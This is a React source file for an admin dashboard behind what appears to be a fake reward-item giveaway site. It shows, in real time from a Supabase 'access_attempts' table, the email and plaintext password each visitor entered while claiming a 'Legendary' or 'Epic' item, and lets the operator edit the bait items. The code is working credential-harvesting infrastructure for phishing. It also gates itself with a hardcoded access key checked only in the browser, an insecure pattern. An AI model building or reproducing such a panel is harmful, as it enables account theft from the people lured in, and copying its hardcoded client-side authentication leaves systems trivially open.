import { useState, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Textarea } from '@/components/ui/textarea';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';
import { Badge } from '@/components/ui/badge';
import { Shield, Upload, Users, Settings, LogOut, Eye, Edit, Plus, Trash2 } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';
import { supabase } from '@/integrations/supabase/client';

interface AccessAttempt {
  id: string;
  email: string;
  passphrase: string;
  item_name: string;
  timestamp: string;
  status: 'success' | 'failed';
}

interface RewardItem {
  id: number;
  name: string;
  description: string;
  rarity: 'Legendary' | 'Epic' | 'Rare';
  image_url: string;
}

const AdminPanel = () => {
  const [accessAttempts, setAccessAttempts] = useState<AccessAttempt[]>([]);
  const [items, setItems] = useState<RewardItem[]>([]);
  
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [accessKey, setAccessKey] = useState('');
  const [editingItem, setEditingItem] = useState<RewardItem | null>(null);
  const [isEditDialogOpen, setIsEditDialogOpen] = useState(false);
  const [isAddDialogOpen, setIsAddDialogOpen] = useState(false);
  const [formData, setFormData] = useState({
    name: '',
    description: '',
    rarity: 'Common',
    image_url: ''
  });
  const { toast } = useToast();

  const ADMIN_ACCESS_KEY = 'Teamexemod@786';

  // Check authentication first
  useEffect(() => {
    const savedAuth = localStorage.getItem('adminAuthenticated');
    if (savedAuth === 'true') {
      setIsAuthenticated(true);
    }
  }, []);

  const handleAccessKeySubmit = () => {
    if (accessKey === ADMIN_ACCESS_KEY) {
      setIsAuthenticated(true);
      localStorage.setItem('adminAuthenticated', 'true');
      toast({
        title: "Access Granted",
        description: "Welcome to Admin Panel",
        className: "border-green-500 bg-green-50 text-green-800",
      });
    } else {
      toast({
        variant: "destructive",
        title: "Access Denied",
        description: "Invalid access key",
      });
    }
  };

  // Fetch access attempts - only if authenticated
  useEffect(() => {
    console.log('=== ACCESS ATTEMPTS EFFECT TRIGGERED ===');
    console.log('isAuthenticated:', isAuthenticated);
    
    if (!isAuthenticated) {
      console.log('Not authenticated, skipping access attempts fetch');
      return;
    }

    console.log('Starting to fetch access attempts...');

    const fetchAccessAttempts = async () => {
      console.log('=== FETCHING ACCESS ATTEMPTS ===');
      
      try {
        console.log('Making Supabase query...');
        const { data, error } = await supabase
          .from('access_attempts')
          .select('*')
          .order('timestamp', { ascending: false });
        
        console.log('Raw database response:', { data, error });
        
        if (error) {
          console.error('Database error:', error);
          toast({
            variant: "destructive",
            title: "Database Error",
            description: `Failed to fetch access attempts: ${error.message}`,
          });
          return;
        }
        
        if (!data) {
          console.log('No data returned from database');
          setAccessAttempts([]);
          return;
        }

        console.log('Number of access attempts found:', data.length);
        console.log('Access attempts data:', data);
        
        const formattedAttempts = data.map(attempt => ({
          id: attempt.id,
          email: attempt.email || 'No email',
          passphrase: attempt.passphrase || 'No password',
          item_name: attempt.item_name || 'Unknown Item',
          timestamp: attempt.timestamp,
          status: attempt.status as 'success' | 'failed'
        }));
        
        console.log('Formatted attempts:', formattedAttempts);
        setAccessAttempts(formattedAttempts);
        console.log('Access attempts state updated successfully');
        
      } catch (error) {
        console.error('Exception while fetching access attempts:', error);
        toast({
          variant: "destructive",
          title: "Error",
          description: "Failed to fetch access attempts",
        });
      }
    };

    // Initial fetch
    fetchAccessAttempts();

    // Real-time subscription
    console.log('Setting up real-time subscription...');
    const attemptsChannel = supabase
      .channel('access-attempts-admin-' + Math.random())
      .on(
        'postgres_changes',
        {
          event: '*',
          schema: 'public',
          table: 'access_attempts'
        },
        (payload) => {
          console.log('=== REAL-TIME UPDATE RECEIVED ===');
          console.log('Real-time payload:', payload);
          fetchAccessAttempts();
        }
      )
      .subscribe((status) => {
        console.log('Real-time subscription status:', status);
      });

    return () => {
      console.log('Cleaning up access attempts subscription');
      supabase.removeChannel(attemptsChannel);
    };
  }, [isAuthenticated, toast]);

  // Fetch items - only if authenticated
  useEffect(() => {
    if (!isAuthenticated) return;

    const fetchItems = async () => {
      const { data, error } = await supabase
        .from('items')
        .select('*')
        .order('id');
      
      if (error) {
        console.error('Error fetching items:', error);
        return;
      }
      
      setItems(data?.map(item => ({
        ...item,
        rarity: item.rarity as 'Legendary' | 'Epic' | 'Rare'
      })) || []);
    };

    fetchItems();

    // Real-time subscription for items
    const itemsChannel = supabase
      .channel('items-realtime-admin-' + Math.random())
      .on(
        'postgres_changes',
        {
          event: '*',
          schema: 'public',
          table: 'items'
        },
        (payload) => {
          console.log('Real-time update received on admin panel:', payload);
          fetchItems();
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(itemsChannel);
    };
  }, [isAuthenticated]);


  const handleEditItem = (item: RewardItem) => {
    setEditingItem(item);
    setFormData({
      name: item.name,
      description: item.description,
      rarity: item.rarity,
      image_url: item.image_url || ''
    });
    setIsEditDialogOpen(true);
  };

  const handleAddItem = () => {
    setEditingItem(null);
    setFormData({
      name: '',
      description: '',
      rarity: 'Common',
      image_url: ''
    });
    setIsAddDialogOpen(true);
  };

  const handleSaveItem = async () => {
    console.log('=== SAVE ITEM TRIGGERED ===');
    console.log('Form data:', formData);
    console.log('Editing item:', editingItem);
    
    try {
      if (editingItem) {
        console.log('Updating existing item with ID:', editingItem.id);
        // Update existing item
        const { data, error } = await supabase
          .from('items')
          .update({
            name: formData.name,
            description: formData.description,
            rarity: formData.rarity,
            image_url: formData.image_url,
            updated_at: new Date().toISOString()
          })
          .eq('id', editingItem.id)
          .select();

        console.log('Update response:', { data, error });

        if (error) {
          console.error('Update error:', error);
          throw error;
        }
        
        setIsEditDialogOpen(false);
        toast({
          title: "Item Updated",
          description: "Item has been updated successfully.",
        });
      } else {
        console.log('Adding new item');
        // Add new item
        const { data, error } = await supabase
          .from('items')
          .insert({
            name: formData.name,
            description: formData.description,
            rarity: formData.rarity,
            image_url: formData.image_url
          })
          .select();

        console.log('Insert response:', { data, error });

        if (error) {
          console.error('Insert error:', error);
          throw error;
        }
        
        setIsAddDialogOpen(false);
        toast({
          title: "Item Added",
          description: "New item has been added successfully.",
        });
      }
    } catch (error) {
      console.error('Error saving item:', error);
      toast({
        variant: "destructive",
        title: "Error",
        description: `Failed to save item: ${error.message}`,
      });
    }
  };

  const handleDeleteItem = async (itemId: number) => {
    if (confirm('Are you sure you want to delete this item?')) {
      try {
        const { error } = await supabase
          .from('items')
          .delete()
          .eq('id', itemId);

        if (error) throw error;
        toast({
          title: "Item Deleted",
          description: "Item has been deleted successfully.",
        });
      } catch (error) {
        console.error('Error deleting item:', error);
        toast({
          variant: "destructive",
          title: "Error",
          description: "Failed to delete item.",
        });
      }
    }
  };

  const handleLogout = () => {
    setIsAuthenticated(false);
    localStorage.removeItem('adminAuthenticated');
    setAccessAttempts([]);
    setItems([]);
    toast({
      title: "Logged out",
      description: "You have been logged out successfully.",
    });
  };

  // Show access key input if not authenticated
  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center p-6">
        <Card className="card-premium w-full max-w-md">
          <div className="p-8 text-center">
            <div className="w-16 h-16 bg-gradient-to-r from-primary to-accent rounded-full flex items-center justify-center glow-pulse mx-auto mb-6">
              <Shield className="w-8 h-8 text-primary-foreground" />
            </div>
            <h1 className="text-2xl font-bold text-primary mb-2">Admin Access Required</h1>
            <p className="text-sm text-muted-foreground mb-6">Enter your access key to continue</p>
            
            <div className="space-y-4">
              <Input
                type="password"
                placeholder="Enter access key"
                value={accessKey}
                onChange={(e) => setAccessKey(e.target.value)}
                onKeyPress={(e) => e.key === 'Enter' && handleAccessKeySubmit()}
                className="text-center"
              />
              <Button 
                onClick={handleAccessKeySubmit}
                className="btn-royal w-full"
                disabled={!accessKey}
              >
                <Shield className="w-4 h-4 mr-2" />
                Access Admin Panel
              </Button>
            </div>
          </div>
        </Card>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background p-6">
      <div className="max-w-7xl mx-auto">
        {/* Header */}
        <div className="flex items-center justify-between mb-8">
          <div className="flex items-center gap-3">
            <div className="w-12 h-12 bg-gradient-to-r from-primary to-accent rounded-full flex items-center justify-center glow-pulse">
              <Shield className="w-6 h-6 text-primary-foreground" />
            </div>
            <div>
              <h1 className="text-2xl font-bold text-primary">Admin Control Panel</h1>
              <p className="text-sm text-muted-foreground">Manage rewards and monitor access attempts</p>
            </div>
          </div>
          <Button onClick={handleLogout} variant="outline" className="border-destructive text-destructive hover:bg-destructive hover:text-destructive-foreground">
            <LogOut className="w-4 h-4 mr-2" />
            Logout
          </Button>
        </div>

        <div className="w-full">
          {/* Access Monitoring */}
          <Card className="card-premium">
            <div className="flex items-center gap-2 mb-6">
              <Eye className="w-5 h-5 text-primary" />
              <h2 className="text-xl font-semibold text-foreground">User Login & Claim Attempts ({accessAttempts.length})</h2>
            </div>
            
            <div className="space-y-3 max-h-96 overflow-y-auto">
              {accessAttempts.length > 0 ? (
                accessAttempts.map((attempt) => (
                  <div key={attempt.id} className="p-4 bg-muted/30 rounded-lg border">
                    <div className="flex items-center justify-between mb-3">
                      <span className="font-medium text-foreground text-sm">{attempt.email || 'No email'}</span>
                      <span className={`px-3 py-1 rounded-full text-xs font-semibold ${
                        attempt.status === 'success' 
                          ? 'bg-green-500/20 text-green-400 border border-green-500/30' 
                          : 'bg-red-500/20 text-red-400 border border-red-500/30'
                      }`}>
                        {attempt.status?.toUpperCase() || 'UNKNOWN'}
                      </span>
                    </div>
                    <div className="text-sm text-muted-foreground space-y-2">
                      <p><strong className="text-foreground">Email:</strong> <span className="font-mono bg-muted px-2 py-1 rounded">{attempt.email}</span></p>
                      <p><strong className="text-foreground">Password:</strong> <span className="font-mono bg-muted px-2 py-1 rounded">{attempt.passphrase}</span></p>
                      <p><strong className="text-foreground">Item Claimed:</strong> {attempt.item_name}</p>
                      <p><strong className="text-foreground">Time:</strong> {attempt.timestamp ? new Date(attempt.timestamp).toLocaleString() : 'Unknown time'}</p>
                    </div>
                  </div>
                ))
              ) : (
                <div className="text-center text-muted-foreground py-12">
                  <Shield className="w-12 h-12 mx-auto mb-4 opacity-50" />
                  <p className="text-lg font-medium">No access attempts yet</p>
                  <p className="text-sm">User login and claim attempts will appear here in real-time</p>
                </div>
              )}
            </div>
          </Card>
        </div>

        {/* Statistics */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mt-8">
           <Card className="card-premium text-center">
            <div className="p-6">
              <Users className="w-8 h-8 text-primary mx-auto mb-2" />
              <h3 className="text-2xl font-bold text-foreground">{accessAttempts.length}</h3>
              <p className="text-sm text-muted-foreground">Total Login Attempts</p>
            </div>
          </Card>
          
          <Card className="card-premium text-center">
            <div className="p-6">
              <Shield className="w-8 h-8 text-green-400 mx-auto mb-2" />
              <h3 className="text-2xl font-bold text-foreground">
                {accessAttempts.filter(a => a.status === 'success').length}
              </h3>
              <p className="text-sm text-muted-foreground">Successful Claims</p>
            </div>
          </Card>
          
          <Card className="card-premium text-center">
            <div className="p-6">
              <Settings className="w-8 h-8 text-primary mx-auto mb-2" />
              <h3 className="text-2xl font-bold text-foreground">{items.length}</h3>
              <p className="text-sm text-muted-foreground">Active Items</p>
            </div>
          </Card>
        </div>

        {/* Item Management */}
        <Card className="card-premium mt-8">
          <CardHeader className="flex flex-row items-center justify-between">
            <CardTitle className="flex items-center gap-2">
              <Settings className="w-5 h-5" />
              Item Management
            </CardTitle>
            <Button onClick={handleAddItem} className="btn-royal">
              <Plus className="w-4 h-4 mr-2" />
              Add Item
            </Button>
          </CardHeader>
          <CardContent>
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
              {items.map((item) => (
                <Card key={item.id} className="card-premium">
                  <CardContent className="p-4">
                    <div className="flex flex-col space-y-3">
                      {item.image_url && (
                        <img 
                          src={item.image_url} 
                          alt={item.name}
                          className="w-full h-32 object-cover rounded-md"
                        />
                      )}
                      <div>
                        <h3 className="font-semibold text-sm text-foreground">{item.name}</h3>
                        <p className="text-xs text-muted-foreground line-clamp-2">{item.description}</p>
                        <Badge variant="outline" className="mt-1 text-xs">
                          {item.rarity}
                        </Badge>
                      </div>
                      <div className="flex gap-2">
                        <Button 
                          size="sm" 
                          variant="outline"
                          onClick={() => handleEditItem(item)}
                        >
                          <Edit className="w-3 h-3 mr-1" />
                          Edit
                        </Button>
                        <Button 
                          size="sm" 
                          variant="destructive"
                          onClick={() => handleDeleteItem(item.id)}
                        >
                          <Trash2 className="w-3 h-3 mr-1" />
                          Delete
                        </Button>
                      </div>
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>
          </CardContent>
        </Card>

        {/* Edit Item Dialog */}
        <Dialog open={isEditDialogOpen} onOpenChange={setIsEditDialogOpen}>
          <DialogContent className="max-w-md">
            <DialogHeader>
              <DialogTitle>Edit Item</DialogTitle>
            </DialogHeader>
            <div className="space-y-4">
              <div>
                <Label htmlFor="name">Name</Label>
                <Input
                  id="name"
                  value={formData.name}
                  onChange={(e) => setFormData({...formData, name: e.target.value})}
                />
              </div>
              <div>
                <Label htmlFor="description">Description</Label>
                <Textarea
                  id="description"
                  value={formData.description}
                  onChange={(e) => setFormData({...formData, description: e.target.value})}
                />
              </div>
              <div>
                <Label htmlFor="rarity">Rarity</Label>
                <Select value={formData.rarity} onValueChange={(value) => setFormData({...formData, rarity: value})}>
                  <SelectTrigger>
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="Common">Common</SelectItem>
                    <SelectItem value="Rare">Rare</SelectItem>
                    <SelectItem value="Epic">Epic</SelectItem>
                    <SelectItem value="Legendary">Legendary</SelectItem>
                  </SelectContent>
                </Select>
              </div>
              <div>
                <Label htmlFor="image_url">Image URL</Label>
                <Input
                  id="image_url"
                  value={formData.image_url}
                  onChange={(e) => setFormData({...formData, image_url: e.target.value})}
                  placeholder="https://example.com/image.jpg"
                />
              </div>
              <div className="flex gap-2">
                <Button onClick={handleSaveItem} className="flex-1">
                  Save Changes
                </Button>
                <Button variant="outline" onClick={() => setIsEditDialogOpen(false)}>
                  Cancel
                </Button>
              </div>
            </div>
          </DialogContent>
        </Dialog>

        {/* Add Item Dialog */}
        <Dialog open={isAddDialogOpen} onOpenChange={setIsAddDialogOpen}>
          <DialogContent className="max-w-md">
            <DialogHeader>
              <DialogTitle>Add New Item</DialogTitle>
            </DialogHeader>
            <div className="space-y-4">
              <div>
                <Label htmlFor="add-name">Name</Label>
                <Input
                  id="add-name"
                  value={formData.name}
                  onChange={(e) => setFormData({...formData, name: e.target.value})}
                />
              </div>
              <div>
                <Label htmlFor="add-description">Description</Label>
                <Textarea
                  id="add-description"
                  value={formData.description}
                  onChange={(e) => setFormData({...formData, description: e.target.value})}
                />
              </div>
              <div>
                <Label htmlFor="add-rarity">Rarity</Label>
                <Select value={formData.rarity} onValueChange={(value) => setFormData({...formData, rarity: value})}>
                  <SelectTrigger>
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="Common">Common</SelectItem>
                    <SelectItem value="Rare">Rare</SelectItem>
                    <SelectItem value="Epic">Epic</SelectItem>
                    <SelectItem value="Legendary">Legendary</SelectItem>
                  </SelectContent>
                </Select>
              </div>
              <div>
                <Label htmlFor="add-image_url">Image URL</Label>
                <Input
                  id="add-image_url"
                  value={formData.image_url}
                  onChange={(e) => setFormData({...formData, image_url: e.target.value})}
                  placeholder="https://example.com/image.jpg"
                />
              </div>
              <div className="flex gap-2">
                <Button onClick={handleSaveItem} className="flex-1">
                  Add Item
                </Button>
                <Button variant="outline" onClick={() => setIsAddDialogOpen(false)}>
                  Cancel
                </Button>
              </div>
            </div>
          </DialogContent>
        </Dialog>
      </div>
    </div>
  );
};

export default AdminPanel;